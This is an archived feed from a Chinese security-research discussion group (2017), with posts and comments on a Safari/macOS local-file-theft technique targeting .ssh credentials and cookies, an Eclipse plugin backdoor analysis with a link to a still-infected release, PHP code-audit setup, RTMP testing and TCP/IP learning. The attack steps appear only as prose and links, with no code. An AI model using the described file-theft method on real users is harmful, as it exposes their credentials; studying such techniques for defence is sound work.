也就是说缺少listenaddress的情况下，是listenaddress=127.0.0.1还是listenaddress=172.26.14.15。


没有listenaddress 参数的话就直接是本地ip地址，你可以用netstat -an 看监听的端口，是0.0.0.0



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-20:


__#姿势#__

  利用 Safari 浏览器获取 macOS 敏感文件

分享来自@嘀嗒的钟  

成功利用这个bug需要满足两个条件，一是通过Safari浏览器访问本地文件，二是需要知道本地文件的绝对路径。

首先，第一个条件如何通过Safari浏览器访问本地文件，一般我们通过file://来访问本地文件，但是像Safari以及Chrome这些浏览器都对访问本地文件作了限制，大部分从Internet上下载的文件也是无法访问本地文件的。但是作者通过测试发现，Safari浏览器会对某些Internet上下载的文件放宽验证机制，从而导致可以访问本地文件（作者在文章中通过Mac桌面版的telegram传播恶意的xhtm可以突破safari浏览器的验证机制）

其次，如何获取本地文件的绝对路径，在macos系统的，如果用户有权访问某个文件夹并且访问过，通常会在该文件夹下生成一个隐藏文件.DS\_Store，.DS\_Store的作用类似于windows系统下的Thumbs.db，但是所不同的是，.DS\_Store 文件包含了文件夹以及该文件夹下所有文件的名称，我们通过解析.DS\_Store就可以获取该文件夹下所有文件和文件夹的名称，这样就可以拼接出文件的绝对路径（理论上可以遍历系统上所有的文件）

因为很多敏感的文件都存在于当前用户文件夹下，例如.ssh文件下的登录凭证，各类浏览器的cookies，对于如何获取当前用户名称，文章提供了一种方法，通过获取系统日志（/var/log/system.log 和 /var/log/install.log）来查找当前用户的名称。

参考链接：

[https://lab.wallarm.com/hunting-the-files-34caa0c1496](https://lab.wallarm.com/hunting-the-files-34caa0c1496)



[如何通过简单的网页文件从macOS中盗取文件？ - 嘶吼 RoarTalk – 回归最本质的信息安全...](http://www.4hou.com/system/7012.html)


PoC: 
[GitHub - Bo0oM/Safiler: Safari local file reader](https://github.com/Bo0oM/Safiler)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个技巧针对 Mac 的攻击，很不错，有实战意义。

<img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 不只是safari吧 同样是输入file://c:/ IE Edge 会直接弹出进入到c盘根目录的窗口 firefox直接会在页面上现实文件 之前leader让我尝试能否关掉这个 查询了很多资料 只是隐约提及了和内核里的文件搜索有关 具体的并没有说出来 然后就产生了一个这样的想法 能否在存在xss的地方插入一段js 让他直接访问受害者file:///c:/Windows/System32/cmd.exe (本地测试 可以打开)然后不在用户处回显 而且像beef一样 回显在攻击者的机子上

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__ replies to <img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__: 我这边Chrome不会打开cmd，而是先下载，下载完提示“此文件可能会损害您的计算机”

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__: Firefox 可行?我这测试好像不行

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 不错😘

<img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__ replies to <img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 我刚重新试了一下 发现更新过后(不知道是浏览器更新还是系统更新 我这是win10)的确不行了 粗略查了查 可能是与'默认打开文件类型'的配置有关 我找个时间再仔细研究下 不过可以确定的是 有可能利用这个查看受害者电脑文件的方法吧

<img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 说的是直接打开cmd？ 我这里现在也不能复现了 不知道是更新系统 还是我调整了ie配置的问题 我再研究下吧(›´ω`‹ )


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-20:

> 匿名用户 提问：
现在的小圈子让我觉得国外的文章copy链接回来发小密圈？   这样子我觉得意义不大我自己都可以开小密圈。


能鼓励大家分享多不容易，你看你这说的，好像大家的分享就是贴个链接而已，这么容易，你去开个吧，然后告诉我，我捧个场去...



...

<img src="https://file.xiaomiquan.com/2d/04/2d04c5195c49789fd86eb912e2ef26da645f19bb1e15ab64753985e2ee22bdba.jpg" width="25px"/> __hezhenhai__: 资源是什么，价值在哪里，针对什么方向，自己消化后要点是什么，有什么看法和疑问，后续可能演进方向。。。我觉得这就是分享的模式吧

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/2d/04/2d04c5195c49789fd86eb912e2ef26da645f19bb1e15ab64753985e2ee22bdba.jpg" width="25px"/> __hezhenhai__: 对


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-18:


__#资源#__

  零基础逆向 Java 某流行恶意插件

分享来自@嘀嗒的钟  

本来是想翻译这篇paper的，但是突然想到圈里一直倡导大家#论英语的重要性，而且对于我这个刚过四级及格线的人，这篇paper能够一口气读下来，居然不需要借助于第三方翻译工具，可见这篇paper是多么通俗易懂，好了切入正题。

这篇paper主要讲的是没有任何逆向经验和hacking经验的纯java开发者，如何一步一步由浅入深的发现Java Eclipse Plugin的一个恶意插件：


[Log in | Eclipse - The Eclipse Foundation open sou...](https://marketplace.eclipse.org/content/eclipse-class-decompiler)



其实读下来你会发现，这个恶意插件并没有什么特殊，无非是收集用户信息，提供一个隐蔽的下载接口，如果硬要说有什么亮点，也就是这个Plugin居然上榜Java Eclipse Plugin Top 20，并有将近400k的下载量。

最后，共勉一下，学习一下作者写paper的技巧，对于不懂java开发的我来说，通读paper下来，完全能够理解逆向这个恶意插件的整个过程和每个步骤，作者这个paper写得很详细，从寻找目标到测试环境搭建到逆向过程分析再到抓包还原，图文并茂 通俗易懂。

强烈建议通读paper！强烈建议通读paper！强烈建议通读paper！重要的事情说三遍。


[Reverse Engineering an Eclipse Plugin – Learning S...](https://0x10f8.wordpress.com/2017/08/07/reverse-engineering-an-eclipse-plugin/)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 感谢@嘀嗒的钟  的分享，确实是一篇好 Paper。顺路召唤更多同学参与分享！

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 搞安全的要把英语提起来哦

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 目前， marketplace已经下架这款恶意插件，所以链接一已经失效，但是插件官网和github目前还可以访问。但是官网和github下下载的插件源代码已经删除了恶意代码部分，不过github上release出的安装包，我看了一下依然包含恶意代码，有兴趣的同学可以研究一下，安装包下载的链接：
[https://github.com/cnfree/Eclipse-Class-Decompiler...](https://github.com/cnfree/Eclipse-Class-Decompiler/releases/download/v2.10.0/eclipse-class-decompiler-update_v2.10.0.zip)


PS：难道这个跟xshell一样，被入侵后恶意添加的？😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 不知道多少人中招，而且这个后门还好危害不是那么直接

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 从marketplace的下载量以及github上源码的更新时间，估计还是很可观的


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-18:

> 熟人不宜 提问：
余弦大大，能否安排一下你们团队的哪个大神分享一下流媒体平台（直播）这方面的安全性问题呢？我最近有个直播平台需要做安全测试，感觉除了常规的web安全（身份验证，鉴权，注入，重放，劫持），没有针对RTMP协议的安全用例。谢谢了！


把你问题放出来，大家可以一起讨论。

我的理解是 HTTP 上的那些安全问题（也就是 Web 安全）该测的都需要覆盖，还有网络系统相关的安全问题。而针对 RTMP 协议，这个协议的应用场景来看，就是做流媒体实时传输有关，他们估计关注：

1. 顺畅性，不要被拒绝服务
2. 不清楚是否有需要解决认证授权的事



...

<img src="https://file.xiaomiquan.com/64/90/649032a29005a37e93906d26f68a0492d5247ecf4cbfea97aa6b0e74a7a6b1b0.jpg" width="25px"/> __一个头两个大大大大大大大大大大大__: RTSP的倒是了解一些，海康威视是典型案例

<img src="https://file.xiaomiquan.com/e8/99/e8995cbaaa741fb20779eff34a1bf93dc54d0ff5113db867b2c2be54e8d5cc07.jpg" width="25px"/> __Null0__: rtsp, rtmp 都是流媒体协议，在摄像头这一块rtsp 认证比较多，直播上用的还没见什么认证

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: RTMP协议主要是推流和抓流的时候用，我理解的也是推流的时候会不会被拒绝服务，抓流的时候因为涉及到CDN估计会有一定分流效果。大家集思广益啊！


...

---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-08-16:


__#代码审计#__

  
__#姿势#__

  
之前发了两篇代码审计的文章，但是感觉大家没什么反应，可能是因为有很多圈友缺乏相应的基础，看起来很费力。因此我决定从零开始讲代码审计，还是那句话，希望各位能有所收获。

今天先来讲环境搭建。首先，你要有一台靶机和攻击机，靶机的操作系统随意，win或者Linux都可以。如果只想放在本地，那么服务器的ip地址不能是127.0.0.1，需要绑定其他ip地址，如192.168.1.100,这样才能使用burpsuite抓包。下面是搭建资料链接。(这一段经 @大宇 同学提醒，已更正)

Linux:

- 
[LAMP环境搭建 - Linux 入门教程 - 极客学院Wiki](http://wiki.jikexueyuan.com/project/linux/lamp.html)


- 
[ApacheMySQLPHP - Community Help Wiki](https://help.ubuntu.com/community/ApacheMySQLPHP)

（这个更简单，一键安装）

Win:

- 
[http://www.phpstudy.net/](http://www.phpstudy.net/)


一个集成环境的软件，非常方便，可以选择版本。

我自己是用Mac的本机当靶机的，然后拿kali虚拟机当攻击机的，环境搭建使用的是MAMP PRO，因为这个集成相当方便，可以快速切换服务器或者php版本。

接下来就是按照phpstorm以及对于代码审计最重要的功能Xdebug。phpstorm各个操作系统都有对应版本，网上都可以找的到。我就不说了。

xdebug的安装资料则如下：

- 
[Xdebug: Documentation](https://xdebug.org/docs/install)



安装之后的配置：

- 
[PhpStorm Xdebug远程调试环境搭建原理分析及问题排查](http://paper.seebug.org/308/)


- 
[PHP调试利器XDebug Mac下安装与使用 | funbox's Blog](https://ifunbox.top/mac_php_xdebug_phpstorm_install)



概括来说就是先安装xdebug，然后修改php配置文件让它找到xdebug并且设置相关的配置信息，最后再在phpstorm里对应起来。最后，浏览器(chrome)记得安装插件jetbrains ide support，配置的地址跟端口也和之前一样。

如果无法顺利配置环境，仔细阅读paper当中的xdebug的原理，思考是哪个环节出了问题，然后再排查。

有人提到seay审计工具。其实也是可以的，但是只有win版本，相比于phpstorm的不同是加入了自动审计功能。不想麻烦配置xdebug的同学可以用seay。


如果做完了这些，你已经迈出了代码审计的第一步，接下来我会由浅入深的讲解php代码审计，从下期分享开始我会尝试用视频录制的形式去做，这样连贯性比较好，也更容易听的懂。

最后，之前有人问我拿代码审计牛的博客。其实大家无非想要的就是干货，下面是几个我觉得代码审计这块干货比较多的。

- 先知安全社区: 
[https://xianzhi.aliyun.com/forum/](https://xianzhi.aliyun.com/forum/)


- i春秋安全社区: 
[https://bbs.ichunqiu.com/forum-59-1.html](https://bbs.ichunqiu.com/forum-59-1.html)


- 知道创宇paper: 
[Paper](http://paper.seebug.org/)


- 勾陈安全实验室: 
[勾陈安全实验室](http://www.polaris-lab.com/)


- 离别歌： 
[首页 | 离别歌](https://www.leavesongs.com/)


- Orange: 
[http://blog.orange.tw/](http://blog.orange.tw/)


- lorexxar: 
[LoRexxar's Blog](https://lorexxar.cn/)



如果有人要补充的，欢迎评论区留言。



...

<img src="https://file.xiaomiquan.com/37/43/374310d6c0d10abd44b2dbd539c133fde6ac46f958196b2b642747858dc0af82.jpg" width="25px"/> __大宇__: 感谢分享

<img src="https://file.xiaomiquan.com/2b/6b/2b6b8251b0ece71353867f72a59c346e90ea5080ba6bbd441359e3e8338d3b0c.jpg" width="25px"/> __Catcher__: 感谢分享～

<img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 感谢分享

<img src="https://file.xiaomiquan.com/67/ce/67cee126d99cee2bd0fbf5b6bd0452c6e75b249d8ed61705c18ad469ad163d3c.jpg" width="25px"/> __ARES__: 很受益。感谢

<img src="https://file.xiaomiquan.com/16/aa/16aa532fb15c30918c1e256fe0663e4434962db15a1cfc459835d2a556a0cbb5.jpg" width="25px"/> __howl__: 后面会有一波分享就太好了。一定支持！

<img src="https://file.xiaomiquan.com/13/70/137012a11284a7beb8a308ca8d88ceb37724ec6909e6f6d8fec32eb5863ebd80.jpg" width="25px"/> __星语__: 赞赞赞

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 视频方式😄，赞！

<img src="https://file.xiaomiquan.com/92/3e/923e5a4fcb40feee5c599097f875a70a2864c539f1e4fabfc126ea5cb03d1a63.jpg" width="25px"/> __gump__: 很荣幸有大神带路，感谢！

<img src="https://file.xiaomiquan.com/91/ab/91abedc3209d808960d74414a5a7631edd9359b5e79703f4d605c02d30cc10a1.jpg" width="25px"/> __任长龙__: 感谢分享

<img src="https://file.xiaomiquan.com/51/d2/51d2c4ce46028b8a20e73e80c24617572fdb4cdf8ee23494fd90f88dbedd9173.jpg" width="25px"/> __Time2AM__: 支持！！！

<img src="https://file.xiaomiquan.com/50/15/50154c902d647320df2ca5062d97714537e014cedca871845319cb445a4fc409.jpg" width="25px"/> __GoodLuck__: 很友好 支持。。。

<img src="https://file.xiaomiquan.com/87/4a/874a9d7bc90aec06621571157ebc051fbde8f37747aa5c2d5a8ebb11163cbe88.jpg" width="25px"/> __风__: 请问一下有没有关于sublime做代码审计的配置？

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 赞！对我们这样基础薄弱的很友好😄

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/87/4a/874a9d7bc90aec06621571157ebc051fbde8f37747aa5c2d5a8ebb11163cbe88.jpg" width="25px"/> __风__: 像sublime或者atom这种编辑器确实可以武装的很像ide一样，但是太麻烦了，ide更方便而且功能强大。

<img src="https://file.xiaomiquan.com/87/4a/874a9d7bc90aec06621571157ebc051fbde8f37747aa5c2d5a8ebb11163cbe88.jpg" width="25px"/> __风__ replies to <img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 好的，谢谢了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-15:


__#公告#__

  [继续号召]关于圈子分享与交流氛围的促进

不少同学有提议想分享内容，但为了圈子质量考虑，如果哪位同学有想分享的可以先私信我，我们代为分享，如果分享精华超高5篇，我们会给你本圈的嘉宾权限，这样之后就可以自由分享。

分享内容不限于：红队技巧（攻击）、蓝队技巧（防御）、黑客成长经验、优秀 Paper 翻译或解读推荐、优秀工具解读推荐、黑客编程经验分享、新漏洞/新威胁经验分享、等。

如果还不明白要怎么分享，看看本圈的“精华”就好，其实不难，对吧？

如果没分享，也可以参与互动，比如点赞、评论等。圈子氛围需要大家共同维护与促进，我们努力来做好这种推动！

请珍惜现在还有的成长氛围。

<img src="https://images.xiaomiquan.com/FqP-WaQn-2hStTMFzWPWdamwKrP4?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:aq68PtXRok-Dh9sG5GltgyyGQWQ=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/e5/ed/e5ed19dec8b178c84d2b6dc707210d763fca1a37f8d64bf6776df8d5d2f9f6ae.jpg" width="25px"/> __Hi__: 唔，我大概属于那种立志刷全栈的爱好先看书再实践的萌新小白，正在看JS入门的那种。不过很想参与分享，感觉分享确实可以保持自己的积极性，也能帮助他人，更能互相讨论提高。不知道分享读书中摘录的要点是否可以呢？手动@余弦大大

<img src="https://file.xiaomiquan.com/c1/72/c172abf7cb79b6e84958c7e46d643c1c4e9dd14a106f35b3bcf1dd251c753a00.jpg" width="25px"/> __ohblackmagic__ replies to <img src="https://file.xiaomiquan.com/e5/ed/e5ed19dec8b178c84d2b6dc707210d763fca1a37f8d64bf6776df8d5d2f9f6ae.jpg" width="25px"/> __Hi__: 估计太初级是不给分享的。同小白。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e5/ed/e5ed19dec8b178c84d2b6dc707210d763fca1a37f8d64bf6776df8d5d2f9f6ae.jpg" width="25px"/> __Hi__: 可以看看先

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 初级的好啊，太深入学习，没空简单的看看试试也算适合:)

<img src="https://file.xiaomiquan.com/e5/ed/e5ed19dec8b178c84d2b6dc707210d763fca1a37f8d64bf6776df8d5d2f9f6ae.jpg" width="25px"/> __Hi__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 好的，谢谢弦哥，我这两天把JS入门经典刷完，然后把整个文件私信给哥：）

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/e5/ed/e5ed19dec8b178c84d2b6dc707210d763fca1a37f8d64bf6776df8d5d2f9f6ae.jpg" width="25px"/> __Hi__: 赞一个

<img src="https://file.xiaomiquan.com/1a/db/1adbf2af8762674318ce8f35cd5ccd83e520ad1436bb0acb2031848305e544e3.jpg" width="25px"/> __小峰__: 如何私信

<img src="https://file.xiaomiquan.com/67/5d/675dffcd278b64e6598f07db21ac3da42c6e05137481c473cfb6f7c14f193c75.jpg" width="25px"/> __Sherlock__: 在微信里没办法私信怎么办

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/67/5d/675dffcd278b64e6598f07db21ac3da42c6e05137481c473cfb6f7c14f193c75.jpg" width="25px"/> __Sherlock__: 不会吧 好些人私信我了


...

---

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ on 2017-08-15:


__#基础#__

   从零构建 TCP / IP 协议

搞安全研究网络协议是基本功。

大家可能听说过 DDoS，DDoS 就是利用网络协议实现的缺陷进行攻击的例子。

我们所有的信息都通过网络协议在传输，了解网络协议有助于我们更深层次的思考问题。

这里有一篇从零开始系列，帮助大家从无到有了解一个协议的诞生过程。


[blog/2017_08_12-tcp_ip.md at master · jiajunhuang/blog · GitHub](https://github.com/jiajunhuang/blog/blob/master/articles/2017_08_12-tcp_ip.md?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io)

 

文中提到的：
《图解 TCP／IP 协议》
《TCP／IP 协议详解卷一：协议》
推荐大家读一读。

至于对网络没有了解的朋友，推荐一本适合入门的网络书籍：
《网络是怎样连接的》
它能帮你快速建立起网络的概念。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 好文

<img src="https://file.xiaomiquan.com/c1/72/c172abf7cb79b6e84958c7e46d643c1c4e9dd14a106f35b3bcf1dd251c753a00.jpg" width="25px"/> __ohblackmagic__: 非常清晰，多谢！

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/c1/72/c172abf7cb79b6e84958c7e46d643c1c4e9dd14a106f35b3bcf1dd251c753a00.jpg" width="25px"/> __ohblackmagic__: 客气：）

<img src="https://file.xiaomiquan.com/b1/52/b15262d1d4b75c57f0d2704faa29d7cd318d1d636d73aadea1247d0302ce1364.jpg" width="25px"/> __Liar__: 好像打不开了啊

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/b1/52/b15262d1d4b75c57f0d2704faa29d7cd318d1d636d73aadea1247d0302ce1364.jpg" width="25px"/> __Liar__: 我这边用运营商网络可以哦

<img src="https://file.xiaomiquan.com/b1/52/b15262d1d4b75c57f0d2704faa29d7cd318d1d636d73aadea1247d0302ce1364.jpg" width="25px"/> __Liar__ replies to <img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 可以了，我刚才科学上网的网出问题了，谢谢了😜

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/b1/52/b15262d1d4b75c57f0d2704faa29d7cd318d1d636d73aadea1247d0302ce1364.jpg" width="25px"/> __Liar__: 不用谢，已举报

<img src="https://file.xiaomiquan.com/b1/52/b15262d1d4b75c57f0d2704faa29d7cd318d1d636d73aadea1247d0302ce1364.jpg" width="25px"/> __Liar__ replies to <img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 😨举报啥

<img src="https://file.xiaomiquan.com/f7/9a/f79af1bde651a9dd2c989af5ff7daef5802563815d9456228954484c65760e60.jpg" width="25px"/> __岳锦文__: 配合wireshark一起食用，效果更佳😄

<img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__: 学习了，从零开始。😉

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__: 😉

<img src="https://file.xiaomiquan.com/aa/2e/aa2e1eff98669584ab72d851b866f5cb1b59f24bfb86e6960bfa9881e05e33a9.jpg" width="25px"/> __RoB__: 精辟

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/aa/2e/aa2e1eff98669584ab72d851b866f5cb1b59f24bfb86e6960bfa9881e05e33a9.jpg" width="25px"/> __RoB__: 😉

<img src="https://file.xiaomiquan.com/e1/0d/e10dbdcd9c404ec785f7ddf3e5ddf7f5402ee81bf46fbc34e92923c6551eb768.jpg" width="25px"/> __尹少爷__: 我买了这本书，看了第一章感觉又清楚了很多～书不错，以前读tcp/ip1，感觉没有串起来，这次把我看的http详解的感觉也都串起来了，感谢一下

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/e1/0d/e10dbdcd9c404ec785f7ddf3e5ddf7f5402ee81bf46fbc34e92923c6551eb768.jpg" width="25px"/> __尹少爷__: 客气😉


...

---


